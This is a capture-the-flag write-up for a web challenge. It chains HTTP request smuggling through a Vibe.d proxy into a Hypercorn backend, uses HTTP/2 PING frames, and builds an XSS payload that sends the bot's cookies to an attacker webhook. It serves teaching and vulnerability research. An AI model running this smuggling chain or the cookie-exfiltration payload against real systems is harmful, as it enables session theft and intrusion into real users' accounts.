# logo

|              |                                                                                             |
| ------------ | ------------------------------------------------------------------------------------------- |
| **CTF**      | [Infobahn CTF 2025](http://2025.infobahnc.tf/) [(CTFtime)](https://ctftime.org/event/2878/) |
| **Author**   | [t-chen](https://github.com/tepel-chen/)                                                    |
| **Category** | web                                                                                         |
| **Solves**   | 0                                                                                           |
| **Files**    | [logo.zip](./logo.zip)                                                                      |

## Hints

### Hint 1

1. Trying to bypass Basic Auth?? → READ THE CHALLENGE DESCRIPTION!!!!!!!!!!!!!!!!!!!!!
2. I hope you’ve already seen my bug report.
3. We don’t see Quart/Hypercorn very often in CTFs, right? How do they differ from Flask/Werkzeug (Gunicorn)?

### Hint 2

[lmao](https://github.com/vibe-d/vibe.d/security/advisories/GHSA-hm69-r6ch-92wx) [lmao](https://github.com/vibe-d/vibe-http/blob/94e4d1fe6c5eace1de38456a79040c5e94b422e7/source/vibe/http/client.d#L941) [lmao](https://github.com/python-hyper/h11/blob/62c5068c971579d61fa1b55373390e12f25fd856/h11/_headers.py#L194-L197)

# Solution

### Step 1: Request smuggling

This is a 1-day challenge based on the [vulnerability for Vibe.d I reported](https://github.com/vibe-d/vibe.d/security/advisories/GHSA-hm69-r6ch-92wx). The HTTP parser used in Vibe.d has a vulnerability which prioritizes `Content-Length` header over `Transfer-Encoding` header, which is against [RFC 9112 § 6.3](https://datatracker.ietf.org/doc/html/rfc9112#section-6.3). This causes request smuggling when Vibe.d is used as a proxy. (If you are not familiar with request smuggling, you should checkout [this blog and video](https://http1mustdie.com/).)

The POC in the github advisories looks like this.

```
GET / HTTP/1.1
Host: localhost
Content-Length: 65
Transfer-Encoding: x, chunked

0

GET /secret HTTP/1.1
Host: localhost
Content-Length: 0
```

This doesn't work in this challenge, so we need to understand how the request smuggling works, especially `Transfer-Encoding: x, chunked` part.

When you send a request to Vibe.d proxy, the server first parses the HTTP, then sends the request using the [`HTTPClient`](https://vibed.org/api/vibe.http.client/HTTPClient) class. All headers in the original request will be directly passed to the client. The client determines the streaming method based on these headers; if the `Transfer-Encoding` header is `chunked`, it uses the chunked stream, and send directly otherwise.

In order for the request smuggling work, we want to send `Transfer-Encoding` header which will be recognized as a `chunked` stream by the backend, but we want the client to send the stream directly at the same time.

In the POC, the value `x, chunked` worked because the client uses the chunked stream only if it matches `chunked` exactly (see [source code](https://github.com/vibe-d/vibe-http/blob/94e4d1fe6c5eace1de38456a79040c5e94b422e7/source/vibe/http/client.d#L941)), while hyper accepts comma-separated values. However, Hypercorn sends `501 Not Implemented` if it sees the value isn't exactly `chunked`, so this doesn't work.

The workaround is that [Hypercorn (or h11) parses the `Transfer-Encoding` header case-insensitively](https://github.com/python-hyper/h11/blob/62c5068c971579d61fa1b55373390e12f25fd856/h11/_headers.py#L194-L197), while Vibe.d doesn't. Hence, the header value like `Chunked` will make Vibe.d to send the request body in normal steam, while parsed as chunked stream in Hypercorn.

### Step 2: Sending smuggled response to the bot.

So how does this relate to XSS exploitation of the bot? The secret is actually written in the GitHub advisory:

> vibe.http.proxy attempts to reuse the same backend connection when possible, even if the original request was made by a different client. Thus, the response to a smuggled request may be delivered to a different user. This can lead to session fixation, malicious redirects to phishing pages, or the escalation of Self-XSS into Stored-XSS.

Which means we can change the response to the bot in the following steps:

1. Send a smuggled request that will be treated as 1 request in the proxy but 2 in the backend.
2. The backend respond with 2 requests, and the first response will be sent as a response for the request in step 1.
3. The bot make a request to the proxy.
4. If the proxy reuses the connection from step 1, the second response from the backend server at step 1 will be used as a response for step 3.

### Step 3: Making use of HEAD request

Breaking the response for the bot sounds like progress, but the backend server only have one route `/`, and we can't control the response body from the backend.

But what if we could make the entire TCP stream as the response body? That doesn't immediately make an XSS payload, but there will be more room to research, right?

We can actually achieve this by sending HEAD request. When you send HEAD request to a server, the server returns the `Content-Length` of the corresponding `GET` response, but does not return a body. We can make use of this as follows:

1. Send a smuggled request that will be treated as 1 request in the proxy but by the backend it is treated as the following requests:
   1. (Part A) Normal GET request
   2. (Part B) HEAD request to `/`
   3. (Part C) A request (or requests) that contains XSS payload in its TCP stream (not necessarily a response body).
2. The backend responds with multiple requests, and the response for Part A will be sent as a response for the request in step 1.
3. The bot make a request to the proxy.
4. If the proxy reuses the connection from step 1, the response from Part B will be used as the response for step 3. The response for Part B will have `Content-Length` header without response body, but the proxy expects a response body because the request for step 3 is a GET request. Consequently, the proxy treats the response for Part C as it's response body.

### Step 4: Making use of HTTP/2

We can now include the whole TCP stream as a response body. For example, if we can include an XSS payload in a response header, then it will be parsed as a response body instead and causes XSS. Unfortunately, we can hardly control the response header in Hypercorn either.

If we can't find a gadget using HTTP/1.1, what about _HTTP/2_? Hypercorn supports HTTP/2 natively, and supports [HTTP/2 with Prior Knowledge](https://datatracker.ietf.org/doc/html/rfc9113#name-starting-http-2-with-prior-) as well. This is, when you send the following request to the server:

```
PRI * HTTP/2.0

SM

```

the following request will be treated as HTTP/2. Surprisingly, this can be done even if HTTP/1.1 requests were sent beforehand in the same TCP connection. (I'm not sure if this behavior in Hypercorn should be considered as a bug, vulnerability or just a design.)

Then, we can use [PING frame](https://datatracker.ietf.org/doc/html/rfc9113#name-ping):

> In addition to the frame header, PING frames MUST contain 8 octets of opaque data in the frame payload. A sender can include any value it chooses and use those octets in any fashion.
> Receivers of a PING frame that does not include an ACK flag MUST send a PING frame with the ACK flag set in response, with an identical frame payload.

Which means, if we send `<script>` in the frame payload, the server will respond with `<script>` in frame payload as well. The whole response frame looks like:

```
\x00\x00\x08\x06\x01\x00\x00\x00\x00<script>
```

Then, it will be parsed as HTML thanks to Step 3.

### Step 5: XSS puzzle

We can somewhat control the response body now, but we only have 8 bytes. We can send multiple PING frames, but junk (`\x00\x00\x08\x06\x01\x00\x00\x00\x00`) will be inserted between each 8 bytes. Can we make XSS payload in this condition?

`<script>` tag doesn't work because the closing tag `</script>` contains 9 bytes, and we cannot modify this. If we are going to use DOM event, we need the length of the event name to be less than 6 because `` onXXX=` `` is 8 bytes.

Looking at [the PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) to find such event, we can see that there's 2 of such events, which is `onend` and `oncut`. `oncut` requires user interaction, so we can't use it here. `onend` event with `<set>` tag looks like this in the cheat sheet:

```html
<svg><set onend="alert(1)" attributename="x" dur="1s"></set></svg>
```

Fortunately, it looks like we don't need `attributename` attribute for this to work, so the attribute that we need is `dur=1s`. All `<svg>`, `<set `, `dur=1s` is under 8 bytes, so we can use this.

Lastly, make sure that the junks are between `/*...*/` or `` `...` `` in javascript so that it doesn't raise error. The payload will look like the following:

```python
ATTACKER_WEBHOOK = "..."
payload = f"document.location.assign(`{ATTACKER_WEBHOOK}?`+document.cookie)"
payloads = [
    b"<svg>   ",
    b"<set    ",
    b" dur=1s ",
    b" onend=`",
    b"`;e=/*..",
    b"*/eval/*",
    b"*/;e(/*.",
    *[f"*/'{p}'+/*".encode() for p in payload],
    b"*/''/*..",
    b"*/) >"
]
```

### Final payload

See [solve.py](./solve.py)
